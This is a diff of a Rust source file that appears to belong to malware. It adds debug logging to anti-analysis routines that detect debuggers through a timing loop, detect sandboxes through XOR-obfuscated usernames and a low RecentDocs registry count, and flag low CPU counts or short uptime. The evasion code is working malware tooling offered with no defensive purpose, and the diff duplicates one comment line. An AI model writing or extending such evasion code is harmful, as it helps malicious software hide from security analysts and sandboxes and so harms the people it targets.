@@ -15,21 +15,30 @@ use log::debug;
 
 /// Returns true if running in hostile/analysis environment
 pub fn is_hostile_environment() -> bool {
+    crate::k::debug::log_op!("AntiAnalysis", "Starting Environment Checks...");
+    
     #[cfg(target_os = "windows")]
     {
+        crate::k::debug::log_detail!("Checking Debugger...");
         if is_debugger_present() {
+            crate::k::debug::log_err!("Debugger Detected!");
             return true;
         }
         
+        crate::k::debug::log_detail!("Checking Sandbox...");
         if is_sandbox() {
+            crate::k::debug::log_err!("Sandbox Detected!");
             return true;
         }
         
+        crate::k::debug::log_detail!("Checking Resources...");
         if is_low_resources() {
+            crate::k::debug::log_err!("Low Resources Detected!");
             return true;
         }
     }
     
+    crate::k::debug::log_op!("AntiAnalysis", "Environment Safe.");
     false
 }
 
@@ -62,7 +71,9 @@ fn is_debugger_present() -> bool {
         let elapsed = start.elapsed().as_micros();
         
         // If loop takes > 1ms, likely being debugged/traced
+        // If loop takes > 1ms, likely being debugged/traced
         if elapsed > 1000 {
+            crate::k::debug::log_detail!("Timing Check Fail: {} micros", elapsed);
             return true;
         }
     }
@@ -189,8 +200,9 @@ fn is_sandbox() -> bool {
         let s6 = x(&[0x3F, 0x3A, 0x3D, 0x3B]);                   // john
         
         let sandbox_users = [s1, s2, s3, s4, s5, s6]; 
-        for s in sandbox_users {
-            if user_lower.contains(&s) {
+        for s in &sandbox_users {
+            if user_lower.contains(s) {
+                crate::k::debug::log_detail!("Bad Username: {}", user_lower);
                 return true;
             }
         }
@@ -231,6 +243,7 @@ fn is_sandbox() -> bool {
                                  std::ptr::null_mut(), std::ptr::null_mut(), std::ptr::null_mut()) == 0 {
                         reg_close(hkey);
                         if num_values < 5 {
+                            crate::k::debug::log_detail!("RecentDocs too low: {}", num_values);
                             return true; // Sandbox detected
                         }
                     } else {
@@ -261,6 +274,7 @@ fn is_low_resources() -> bool {
         .unwrap_or(1);
     
     if cpu_count < 2 {
+        crate::k::debug::log_detail!("Low CPU Core Count: {}", cpu_count);
         return true;
     }
     
@@ -302,6 +316,7 @@ fn is_low_resources() -> bool {
         let uptime_min = uptime_ms / 60000;
         
         if uptime_min < 5 {
+            crate::k::debug::log_detail!("Uptime too short: {} min", uptime_min);
             return true;
         }
     }
